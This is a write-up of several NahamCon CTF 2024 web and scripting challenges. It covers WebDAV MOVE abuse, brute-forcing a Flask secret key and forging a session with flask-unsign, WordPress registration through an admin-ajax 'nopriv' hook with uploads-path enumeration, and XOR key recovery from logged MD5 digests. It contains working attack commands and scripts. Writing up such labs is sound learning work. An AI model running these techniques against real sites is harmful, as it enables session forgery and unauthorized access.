---
date: 2024-05-29
description: webdav, flask brute, wp, reversing encrypted log
platform: NahamCon CTF 2024
categories: Web, Scripting
tags:
  - WebDav
  - flask
  - code-review
  - brute-force/authentication
  - wordpress
  - hash
  - reversing
duration:
---

# NahamCon CTF 2024 Writeups
Writeups for some web and scripting challenges including the wordpress whitebox challenges

---

# Web
## The Davinci Code (50 pts)
> Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken... 

`#webdav` 

This is a challenge relating to WebDav. We can see in the `/code` path that it returns a error and discloses the flask source code. The base path `/` with supported methods=`['GET', 'PROPFIND']` is shown. Using `PROPFIND` function and performing directory listing/traversal will lead us to a directory with a flag.txt. We cannot read this directly, but we do know the location of the flag.

Knowing about `PROPFIND` we can fingerprint its probably using webdav and learn above some additional methods like `MOVE`
https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926(v=exchg.65).
<!-- {{< image src="image.png" width="100%">}} -->
![Alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image.png)


### Attack Chain
```sh
GET /code
# directory listing /
PROPFIND / 
# we can find /the_secret_dav_inci_codef/flag.txt
PROPFIND /the_secret_dav_inci_code 

# move unaccessible resource to static 
MOVE /the_secret_dav_inci_code/flag.txt HTTP/1.1
Destination: /static/flag.txt

GET /static/flag.txt 
```

### MOVE the flag
![Alt text](image-21.png)
![Alt text](static.png)


## Thomas DEVerson (175 pts)
> All things considered, I'm impressed this website is still up and running 200 years later. 

`#flask-session` `#brute-force` 

Flask session brute-forcing challenge. There is a source code disclosure in `/backup` revealing the secret_key value which eappends current datetime value to the flask secret. `THE_REYNOLDS_PAMPHLET-`  We are also given available users

### /backup
![alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-3.png)

Clue when the `datetime.now()` was initially ran in `/status`

![alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-2.png)

From this we can learn try and generate a valid secret by subtracting current date to the returned output from status.

### get_secret.py
I used this script to potentially find the exact value of the secret by subtracting current datetime with the results from /status but did not work. It helped since I got the year and close with the correct value.

```python
from datetime import datetime, timedelta
import requests 
import re
resp = requests.get("http://challenge.nahamcon.com:31915/status")

print(resp.text)

match = re.search(r"(\d+) days (\d+) hours (\d+) minutes", resp.text) 
if match:
    days= int(match.group(1))
    hours = int(match.group(2))
    minutes = int(match.group(3))

    current_date = datetime.now() 
    timedelta_to_subtract = timedelta(days=days, hours=hours, minutes=minutes)

    resulting_date = current_date - timedelta_to_subtract
    print("Resulting date and time:", resulting_date)
    formatted = resulting_date.strftime("%Y%m%d%H%M")
    
    secret_key = f'THE_REYNOLDS_PAMPHLET-{formatted}'
    print(secret_key)
```


![Alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-4.png)

output `THE_REYNOLDS_PAMPHLET-179708251645`. We can try this and forge our own cookie and submit to the `/message` endpoint but this will not work. 
```bash
flask-unsign --sign --cookie "{'name': 'Jefferson'}" --secret 'THE_REYNOLDS_PAMPHLET-179708251645'
```
Since we already know parts of the key and the rest are just datetime integers can just brute-force this since we know its year/month is most likely correct. Worst case brute-force each digit which is not that complex as well.


### brute-force flask key
```bash
#!/bin/bash

for i in {0..99999}; do
    echo "THE_REYNOLDS_PAMPHLET-1797082$i"
done > words.txt
```

![Alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-5.png)

```bash
# brute-force flask session cookie
flask-unsign --unsign --cookie < cookie.txt --wordlist words.txt

# forge our own session token
flask-unsign --sign --cookie "{'name': 'Jefferson'}" --secret 'THE_REYNOLDS_PAMPHLET-179708250845'

```
output: `eyJuYW1lIjoiSmVmZmVyc29uIn0.ZlDoZA.S5h0UBS1jk8CX4I9P5jCrVsBDOA` paste to our session cookie and get the flag 

![alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-7.png)


## Secret Info (460 pts)
`#wordpress` `#code-review` 

Under Sponsorship category. This is a Whitebox web challenge involving wordpress.
> Our admin accidentally published some secret _attachments on our site. Unfortunately, somehow we are not able to unpublish the secret image, however, we tried to apply some protection to our site. This should be enough, right?
This is a fully white box challenge, almost no heavy brute force is needed.

We are provided a wordpress source code with docker file. The only thing here that might be related to the challenge is the `test-plugin.php` and the flag.png. 

![Alt text](image-11.png)

When we register through browser, we can't actually activate our account because our the email service is not working and we can't confirm our account and login. There is no way to register through the browser. This is where the **feature** in the `test-plugin.php` will be used. 

### Registration through admin-ajax 
Looking at the `test-plugin.php` I tried to learn about what this source code and simply asked my friend Chat-GPT
```php
define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' );
define( 'PLUGIN_NAME_VERSION', '1.0.0' );
define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) );
define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) );
define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) );
define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) );

add_action("wp_ajax_nopriv_register_user", "register_user");

function register_user(){
    $username = sanitize_text_field($_POST["username"]);
    $password = sanitize_text_field($_POST["password"]);
    $email = sanitize_text_field($_POST["email"]);

    wp_create_user($username, $password, $email);
    echo "user created";
}
```
![alt text](image-15.png)

The `add_action("wp_ajax_nopriv_register_user", "register_user");` is an action hook that allows user registration through `wp-admin/admin-ajax.php`  https://developer.wordpress.org/plugins/javascript/ajax/

The request made to `admin-ajax.php` will look like this
![Alt text](image-17.png)

We now login through wordpress by using credentials registered through `admin-ajax.php`
![Alt text](image-18.png)

### Brute-Forcing media content
We got through dashboard. Now what? I really thought that after getting in the dashboard I could just access the flag in the media files but it seems that i cannot view the media files with my role. 

I learned media files are available once authenticated and once we know the file name that we are looking for we can just brute-force the `/uploads` directory year and date.
![Alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-1.png)

In the Dockerfile we can see the `flag.png` is renamed to `/flag_secret_not_so_random_get_me_1337.png`

```Dockerfile
RUN docker-php-ext-install zip
RUN docker-php-ext-install gd

COPY flag.png /flag_secret_not_so_random_get_me_1337.png
COPY plugins/test-plugin /tmp/test-plugin
COPY .htaccess /tmp/.htaccess 

ENTRYPOINT [ "make", "-f", "/scripts/Makefile" ]  
```

Using this script, I Brute-forced the flag from the uploads directory
```python
import requests

base_url = "http://localhost:8687//wp-content/uploads"
headers = {
    "Cookie": "<wp-cookies>"
}

year = 2024
for month in range(0, 13):
    if len(str(month)) == 1: 
        month = "0" + str(month)
    url = f"{base_url}/{year}/{month}/flag_secret_not_so_random_get_me_1337.png"
    resp = requests.get(url, headers=headers)
    print(len(resp.content), url)
    if "Page Not Found" not in resp.text: 
        print("Flag URL:", url)
        break
```
![Alt text](image-20.png)
![Alt text](secret-info.png)


## WP Elevator (in-progress)
`#wordpress` `#code-review`
> Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don't know how it works but will talk with him once he finishes. 

This is also Wordpress whitebox web Challenge similar to Secret Info. I was able not able to solve this during competition but I want to create writeup. Will be updating once i solve the challenge offline.

# Scripting 
## Base3200 (50 pts)
> You know what to do. 

First thing I did was searched google for some scripts and I instantly found one that solved it. 
https://gist.github.com/intrd/c63db7bd3d0951f0653d6fdf7ea169d6. 

This decodes from base64 the provided file 50 times. can also be done through bash by doing `cat theflag | base64 -d | base64 -d ...` 50 times 
👿
```python3
import base64

pontfile = 'theflag'

with open(pontfile, 'r') as f:
    content = f.read()

for _ in range(50):
    content = base64.b64decode(content)

print(content)
# flag{340ff1bee05244546c91dea53fba7642}
```

## Hashes on Hashes on Hashes (310 pts)
`#brute-force` `#decryption`
> I created a server to manage all my encrypted data from my lucrative ransomware business. It's still in development, but I should be okay as long as.. wait, what? Somebody leaked a log file?? 

We are given the `decryption_server.log`


![Alt text](ctf/Jeopardy/2024/NahamCon%20CTF%202024/_attachments/image-8.png)

server.py provided file
```python
import socket
import base64
from hashlib import md5
from datetime import datetime

host = '0.0.0.0'
port = 9001

class log:
    @staticmethod
    def print(message):
        with open('./test.log', 'a') as f:
            now = datetime.now()
            f.write(now.strftime("%d/%m/%Y %H:%M:%S") + "\t")
            f.write(message + '\n')    

def decrypt(encrypted):
    key = open('key.txt').read()
    key = key.strip()
    log.print("Key loaded for encrypted message")

    factor = len(encrypted) // len(key) + 1
    key = key * factor
    log.print(f"Key expanded by factor of {factor}")
    key_bytes = key.encode()

    enc_bytes = base64.b64decode(encrypted)
    dec_bytes = bytearray()

    for i in range(len(enc_bytes)):
        dec_bytes.append(enc_bytes[i] ^ key_bytes[i])
        log.print(f"Partial message digest is {md5(dec_bytes).hexdigest()}")
    decrypted = dec_bytes.decode()
    log.print("Message fully decrypted, ready to send...")
    return decrypted

def main_loop():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    log.print(f"Server listening on host {host} and port {port}")
    
    while True:
        s.listen(1)
        log.print("Listening for connection...")

        c_soc, addr = s.accept()
        log.print(f"Connection received from {addr}")

        ciphertext = c_soc.recv(1024).decode().strip()
        log.print(f"Received encrypted message {ciphertext}")

        plaintext = decrypt(ciphertext)
        c_soc.sendall(plaintext.encode())
        log.print(f"Decrypted message sent!")


if __name__ == '__main__':
    main_loop()
```

### Message decryption
```python
def decrypt(encrypted):
    key = open('key.txt').read()
    key = key.strip()
    log.print("Key loaded for encrypted message")

    factor = len(encrypted) // len(key) + 1
    # matches the key length to the length of base64 encoded text
    key = key * factor
    log.print(f"Key expanded by factor of {factor}")
    key_bytes = key.encode()
    # decrypt from base64 
    enc_bytes = base64.b64decode(encrypted)
    dec_bytes = bytearray()

    for i in range(len(enc_bytes)):
        # md5(b64decoded XOR key)
        dec_bytes.append(enc_bytes[i] ^ key_bytes[i])
        log.print(f"Partial message digest is {md5(dec_bytes).hexdigest()}")

    decrypted = dec_bytes.decode('utf-8', 'backslashreplace')
    log.print("Message fully decrypted, ready to send...")
    return decrypted

```
The message is decrypted with this steps
1. The decrypt function works by accepting a ciphertext (`base64 encoded`) message. 
2. Expand the key by repeating it enough times to match the length of the ciphertext.
3. Decode the ciphertext `from base64` and iterate. 
4. For each iteration it performs `XOR` operation between the `base64 decoded ciphertext` and the `key`. Both are in bytes. 
5. Then converts it to `MD5` that we see in the server logs.


### decrypt.py 
For my solution. I just tried iterating all printable ascii characters for the key until it matched the MD5 when XORed into the ciphertext. 
and then add that character to the known value of the key. This decrypts the captured MD5 and b64 in the log file.
```python
from server import decrypt 
from hashlib import md5
import base64
import string
import re


b64_map = {} # { b64: [md5, md5...], b64: [md5, md5] }
logs = []
keys = [] 
b64 = ""

def brute_force_key(encrypted, key, target_md5):
    factor = len(encrypted) // len(key) + 1
    key = key * factor
    key_bytes = key.encode()
    enc_bytes = base64.b64decode(encrypted)
    dec_bytes = bytearray()
    for i in range(0, len(enc_bytes)):
        dec_bytes.append(enc_bytes[i] ^ key_bytes[i])
        if  md5(dec_bytes).hexdigest() == target_md5:
            return key[i]

# parse decrpytion server log
with open('decryption_server.log', 'r') as file:
    logs = file.readlines()

for log in logs:
    b64_match = re.search(r"Received encrypted message (.*)", log)
    if b64_match:
        b64 = b64_match.group(1)
        longest = True
    match = re.search(r"Partial message digest is (.*)", log)
    if match:
        hash_ = match.group(1)
        if b64_map.get(b64) != None:
            b64_map[b64].append(hash_)
        else:
            b64_map[b64] = [hash_]

# brute force key in hash
for target in b64_map:
    key = ""
    for md5_hash in b64_map[target]:
        for c in string.printable:
            if key == "":
                payload = str(c) * len(target)
            else:
                payload = key + str(c) * len(target)
            key_part = brute_force_key(target, payload, md5_hash)
            if key_part:
                key += key_part
                break
    keys.append(key)
    
print("key used for encryption:", max(keys))

with open('key.txt', 'w') as file: 
    file.write(max(keys))

print("decrypted text ", '-'*100)
for b in b64_map:
    print(decrypt(b))
```
![Alt text](image-10.png)

